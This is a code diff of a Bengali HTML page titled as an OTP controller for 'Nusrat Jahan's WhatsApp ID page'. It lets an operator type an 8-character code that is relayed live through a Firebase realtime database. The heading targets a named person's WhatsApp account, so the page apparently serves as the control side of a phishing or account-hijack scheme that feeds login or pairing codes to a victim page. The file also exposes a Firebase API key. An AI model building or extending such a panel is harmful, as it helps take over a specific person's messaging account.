@@ -1,71 +1,163 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <title>OTP কন্ট্রোল প্যানেল</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
-    <style>
-        body { 
-            font-family: 'Kalpurush', sans-serif;
-            background: linear-gradient(135deg, #1e3a8a, #312e81, #1e3a8a); /* Deep blue/purple gradient */
-            color: #e5e7eb; 
-        }
-        .glass-card {
-            background: rgba(17, 24, 39, 0.5); /* Semi-transparent dark background */
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .pin-inputs input {
-            width: 60px; /* Increased width */
-            height: 75px; /* Increased height */
-            text-align: center;
-            font-size: 2.5rem; /* Increased font size */
-            font-weight: bold;
-            background-color: rgba(0, 0, 0, 0.3);
-            border: 2px solid #4b5563;
-            color: #f9fafb;
-            border-radius: 0.75rem; /* More rounded corners */
-            margin: 0 0.3rem;
-            transition: all 0.2s ease-in-out;
-        }
-        .pin-inputs input:focus { 
-            border-color: #06b6d4; /* Bright cyan on focus */
-            outline: none; 
-            transform: scale(1.1);
-            box-shadow: 0 0 20px rgba(6, 182, 212, 0.4);
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <title>OTP কন্ট্রোল প্যানেল</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+
+  <style>
+    * { transition: all 0.3s ease; }
+    body {
+      font-family: 'Kalpurush', sans-serif;
+      background: radial-gradient(circle at top right, #1e3a8a, #0f172a 70%);
+      color: #e2e8f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .float {
+      animation: float 6s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .glass-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(25px);
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.4);
+      border-radius: 1.5rem;
+      transition: all 0.3s ease;
+      animation: float 5s ease-in-out infinite;
+    }
+    .pin-inputs input {
+      width: 65px;
+      height: 80px;
+      text-align: center;
+      font-size: 2.5rem;
+      font-weight: bold;
+      color: #f9fafb;
+      border-radius: 1rem;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.1);
+      margin: 0 0.4rem;
+      text-transform: uppercase;
+      transition: all 0.15s ease;
+    }
+    .pin-inputs input:focus {
+      border-color: #06b6d4;
+      outline: none;
+      background: rgba(6, 182, 212, 0.15);
+      transform: scale(1.15);
+      box-shadow: 0 0 25px rgba(6, 182, 212, 0.5);
+    }
+    .pin-inputs input.filled {
+      border-color: #22d3ee;
+      box-shadow: 0 0 15px rgba(34, 211, 238, 0.4);
+    }
+    .live-display {
+      letter-spacing: 0.3rem;
+      font-size: 3rem;
+      font-weight: bold;
+      color: #22d3ee;
+      text-shadow: 0 0 25px rgba(6, 182, 212, 0.6);
+      transition: all 0.2s ease-in-out;
+    }
+    .live-display.animate {
+      transform: scale(1.2);
+    }
+    #toggleTheme {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: rgba(6, 182, 212, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #22d3ee;
+      border-radius: 50%;
+      width: 45px;
+      height: 45px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      backdrop-filter: blur(10px);
+    }
+    #toggleTheme:hover {
+      background: rgba(6, 182, 212, 0.3);
+      transform: rotate(15deg);
+    }
+    .pulse {
+      width: 12px;
+      height: 12px;
+      background-color: #06b6d4;
+      border-radius: 50%;
+      margin-left: 10px;
+      animation: pulse 1.2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.8); opacity: 0.5; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+  </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body>
 
-<div class="glass-card p-8 rounded-2xl shadow-2xl text-center max-w-lg w-full">
-    <h1 class="text-3xl font-bold mb-4 text-white flex items-center justify-center">
-        <i class="fa fa-keyboard mr-3 text-cyan-400"></i>
-        নুসরাত জাহান হোয়াটসঅ্যাপ আইডির পেজ টির ওটিপি box কন্ট্রোলার
+  <!-- Theme Toggle -->
+  <div id="toggleTheme" title="Toggle Light/Dark">
+    <i class="fa fa-sun text-lg"></i>
+  </div>
+
+  <!-- Display Panel -->
+  <div class="mb-10 text-center float">
+    <h2 class="text-xl text-gray-300 mb-2 flex justify-center items-center gap-2">
+      <i class="fa fa-broadcast-tower text-cyan-400"></i> লাইভ ওটিপি ভিউ
+    </h2>
+    <div id="liveDisplay" class="live-display tracking-widest">--------</div>
+  </div>
+
+  <!-- OTP Input Panel -->
+  <div class="glass-card p-10 text-center max-w-lg w-full">
+    <h1 class="text-3xl font-bold mb-4 text-cyan-400 flex items-center justify-center gap-3">
+      <i class="fa fa-keyboard"></i>
+      নুসরাত জাহান হোয়াটসঅ্যাপ OTP কন্ট্রোলার
     </h1>
-    <p class="mb-8 text-gray-400">এখানে কোড টাইপ করুন, এটি লাইভ আপডেট হবে।</p>
-    
-    <div id="pinContainer" class="flex flex-wrap justify-center items-center pin-inputs">
-        <input type="text" maxlength="1">
-        <input type="text" maxlength="1">
-        <input type="text" maxlength="1">
-        <input type="text" maxlength="1">
-        <span class="text-4xl mx-2 self-center text-gray-500">-</span>
-        <input type="text" maxlength="1">
-        <input type="text" maxlength="1">
-        <input type="text" maxlength="1">
-        <input type="text" maxlength="1">
+    <p class="mb-6 text-gray-400">প্রতি বক্সে এক অক্ষর টাইপ করুন — লাইভ আপডেট হবে</p>
+
+    <div id="pinContainer" class="flex flex-wrap justify-center items-center pin-inputs mb-6">
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <span class="text-4xl mx-2 text-gray-500">-</span>
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
     </div>
-</div>
 
-<!-- Firebase SDK (v8) -->
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <div class="flex justify-center items-center gap-2">
+      <span class="text-sm text-gray-400">Live Connection</span>
+      <div class="pulse"></div>
+    </div>
+  </div>
 
-<script>
-    // আপনার দেওয়া Firebase configuration কোড
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <script>
     const firebaseConfig = {
       apiKey: "AIzaSyA--EbKHCyRtTp4AgBZua22Ad2J7JRbS28",
       authDomain: "control-my-page.firebaseapp.com",
@@ -77,37 +169,61 @@
       measurementId: "G-37RH0B37KK"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
     const pinInputs = document.querySelectorAll('#pinContainer input');
+    const liveDisplay = document.getElementById('liveDisplay');
+    const toggleTheme = document.getElementById('toggleTheme');
+    let isLight = false;
 
     function updateFirebase() {
-        const code = [...pinInputs].map(input => input.value).join('');
-        database.ref('liveCode').set({
-            code: code.padEnd(8, ' ')
-        });
+      const code = [...pinInputs].map(input => input.value).join('');
+      database.ref('liveCode').set({ code: code.padEnd(8, ' ') });
+    }
+
+    function updateDisplay(code) {
+      const formatted = code.padEnd(8, '-');
+      liveDisplay.textContent = formatted.slice(0, 4) + '-' + formatted.slice(4, 8);
+      liveDisplay.classList.add('animate');
+      setTimeout(() => liveDisplay.classList.remove('animate'), 200);
     }
 
     pinInputs.forEach((input, index) => {
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && input.value === '') {
-                if (index > 0) {
-                    pinInputs[index - 1].focus();
-                }
-            }
-        });
+      input.addEventListener('input', (e) => {
+        let val = e.target.value.toUpperCase().slice(0, 1);
+        e.target.value = val;
 
-        input.addEventListener('input', () => {
-            if (input.value) {
-                if (index < pinInputs.length - 1) {
-                    pinInputs[index + 1].focus();
-                }
-            }
-            updateFirebase();
-        });
+        if (val !== "") {
+          input.classList.add('filled');
+          if (index < pinInputs.length - 1) pinInputs[index + 1].focus();
+        } else {
+          input.classList.remove('filled');
+        }
+
+        const code = [...pinInputs].map(i => i.value).join('');
+        updateDisplay(code);
+        updateFirebase();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
     });
-</script>
 
+    database.ref('liveCode').on('value', snapshot => {
+      const val = snapshot.val();
+      if (val && val.code) {
+        updateDisplay(val.code.trim());
+      }
+    });
+
+    toggleTheme.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      isLight = !isLight;
+      toggleTheme.innerHTML = `<i class="fa ${isLight ? 'fa-moon' : 'fa-sun'} text-lg"></i>`;
+    });
+  </script>
 </body>
 </html>
